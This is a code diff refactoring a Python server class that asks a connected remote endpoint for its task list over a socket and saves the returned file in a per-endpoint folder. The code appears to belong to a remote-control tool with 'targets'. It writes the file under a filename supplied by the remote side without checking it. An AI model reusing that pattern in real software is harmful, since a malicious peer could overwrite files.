@@ -8,17 +8,10 @@ import os
 
 
 class Tasks:
-    def __init__(self, con, ip, clients, connections, targets, ips, tmp_availables, log_path, path, sname):
-        self.con = con
-        self.ip = ip
-        self.clients = clients
-        self.connections = connections
-        self.targets = targets
-        self.ips = ips
-        self.tmp_availables = tmp_availables
+    def __init__(self, endpoint, log_path, path):
+        self.endpoint = endpoint
         self.log_path = log_path
         self.path = path
-        self.sname = sname
 
     def get_date(self):
         d = datetime.now().replace(microsecond=0)
@@ -59,50 +52,37 @@ class Tasks:
             res += b[i] << (i * 8)
         return res
 
-    def make_dir(self, ip):
+    def make_dir(self):
         self.logIt_thread(self.log_path, msg=f'Running make_dir()...')
         self.logIt_thread(self.log_path, msg=f'Creating Directory...')
-
-        for conKey, macValue in self.clients.items():
-            for macKey, ipVal in macValue.items():
-                for ipKey, userValue in ipVal.items():
-                    if ipKey == ip:
-                        for item in self.tmp_availables:
-                            if item[1] == ip:
-                                for identKey, timeValue in userValue.items():
-                                    name = item[2]
-                                    loggedUser = item[3]
-                                    clientVersion = item[4]
-                                    path = os.path.join(self.root, name)
-
-                                    try:
-                                        os.makedirs(path)
-                                        return path
-
-                                    except FileExistsError:
-                                        self.logIt_thread(self.log_path, msg=f'Passing FileExistsError...')
-                                        pass
-
-    def tasks(self, ip) -> str:
-        self.logIt_thread(self.log_path, msg=f'Running tasks({ip})...')
+        path = os.path.join(self.path, self.endpoint.ident)
         try:
-            self.logIt_thread(self.log_path, msg=f'Sending tasks command to {ip}...')
-            self.con.send('tasks'.encode())
+            os.makedirs(path)
+
+        except FileExistsError:
+            self.logIt_thread(self.log_path, msg=f'Passing FileExistsError...')
+            pass
+
+    def tasks(self) -> str:
+        self.logIt_thread(self.log_path, msg=f'Running tasks({self.endpoint.ip})...')
+        try:
+            self.logIt_thread(self.log_path, msg=f'Sending tasks command to {self.endpoint.ip}...')
+            self.endpoint.conn.send('tasks'.encode())
             self.logIt_thread(self.log_path, msg=f'Send complete.')
 
-            self.logIt_thread(self.log_path, msg=f'Waiting for filename from {ip}...')
-            self.con.settimeout(10)
-            filenameRecv = self.con.recv(1024).decode()
-            self.con.settimeout(None)
+            self.logIt_thread(self.log_path, msg=f'Waiting for filename from {self.endpoint.ip}...')
+            self.endpoint.conn.settimeout(10)
+            filenameRecv = self.endpoint.conn.recv(1024).decode()
+            self.endpoint.conn.settimeout(None)
             self.logIt_thread(self.log_path, msg=f'Filename: {filenameRecv}.')
 
             self.logIt_thread(self.log_path, msg=f'Sleeping for {0.5} seconds...')
             time.sleep(1)
 
-            self.logIt_thread(self.log_path, msg=f'Waiting for file size from {ip}...')
-            self.con.settimeout(10)
-            size = self.con.recv(4)
-            self.con.settimeout(None)
+            self.logIt_thread(self.log_path, msg=f'Waiting for file size from {self.endpoint.ip}...')
+            self.endpoint.conn.settimeout(10)
+            size = self.endpoint.conn.recv(4)
+            self.endpoint.conn.settimeout(None)
             self.logIt_thread(self.log_path, msg=f'Size: {size}.')
 
             self.logIt_thread(self.log_path, msg=f'Converting size bytes to numbers...')
@@ -113,15 +93,15 @@ class Tasks:
             self.logIt_thread(self.log_path, msg=f'Renaming {filenameRecv}...')
             filenameRecv = str(filenameRecv).strip("b'")
 
-            self.logIt_thread(self.log_path, msg=f'Calling self.make_dir({ip})...')
-            path = self.make_dir(ip)
+            self.logIt_thread(self.log_path, msg=f'Calling self.make_dir({self.endpoint.ip})...')
+            self.make_dir()
 
             self.logIt_thread(self.log_path, msg=f'Writing content to {filenameRecv}...')
             with open(filenameRecv, 'wb') as tsk_file:
-                self.con.settimeout(60)
+                self.endpoint.conn.settimeout(60)
                 while current_size < size:
-                    self.logIt_thread(self.log_path, msg=f'Receiving file content from {ip}...')
-                    data = self.con.recv(1024)
+                    self.logIt_thread(self.log_path, msg=f'Receiving file content from {self.endpoint.ip}...')
+                    data = self.endpoint.conn.recv(1024)
                     if not data:
                         break
 
@@ -131,25 +111,25 @@ class Tasks:
                     buffer += data
                     current_size += len(data)
                     tsk_file.write(data)
-                self.con.settimeout(None)
+                self.endpoint.conn.settimeout(None)
 
             self.logIt_thread(self.log_path, msg=f'Printing file content to screen...')
             with open(filenameRecv, 'r') as file:
                 data = file.read()
 
-            self.logIt_thread(self.log_path, msg=f'Sending confirmation to {ip}...')
-            self.con.send(f"Received file: {filenameRecv}\n".encode())
+            self.logIt_thread(self.log_path, msg=f'Sending confirmation to {self.endpoint.ip}...')
+            self.endpoint.conn.send(f"Received file: {filenameRecv}\n".encode())
             self.logIt_thread(self.log_path, msg=f'Send complete.')
 
-            self.logIt_thread(self.log_path, msg=f'Waiting for closer from {ip}...')
-            self.con.settimeout(10)
-            msg = self.con.recv(1024).decode()
-            self.con.settimeout(None)
-            self.logIt_thread(self.log_path, msg=f'{ip}: {msg}')
+            self.logIt_thread(self.log_path, msg=f'Waiting for closer from {self.endpoint.ip}...')
+            self.endpoint.conn.settimeout(10)
+            msg = self.endpoint.conn.recv(1024).decode()
+            self.endpoint.conn.settimeout(None)
+            self.logIt_thread(self.log_path, msg=f'{self.endpoint.ip}: {msg}')
 
             # Move screenshot file to directory
             src = os.path.abspath(filenameRecv)
-            dst = fr"{self.path}\{self.sname}"
+            dst = fr"{self.path}\{self.endpoint.ident}"
 
             self.logIt_thread(self.log_path, msg=f'Moving {src} to {dst}...')
             try:
@@ -162,24 +142,4 @@ class Tasks:
 
         except (WindowsError, socket.error) as e:
             self.logIt_thread(self.log_path, msg=f'Error: {e}')
-            print(f"[{colored('!', 'red')}]{e}")
-            self.remove_lost_connection()
-
-    def remove_lost_connection(self):
-        self.logIt_thread(self.log_path, msg=f'Running self.remove_lost_connection()...')
-        try:
-            for conKey, ipValue in self.clients.items():
-                if conKey == con:
-                    for ipKey, identValue in ipValue.items():
-                        if ipKey == ip:
-                            for identKey, userValue in identValue.items():
-                                self.targets.remove(con)
-                                self.ips.remove(ip)
-
-                                del self.connections[con]
-                                del self.clients[con]
-            return False
-
-        except Exception as e:
-            self.logIt_thread(self.log_path, msg=f'Error: {e}.')
             return False
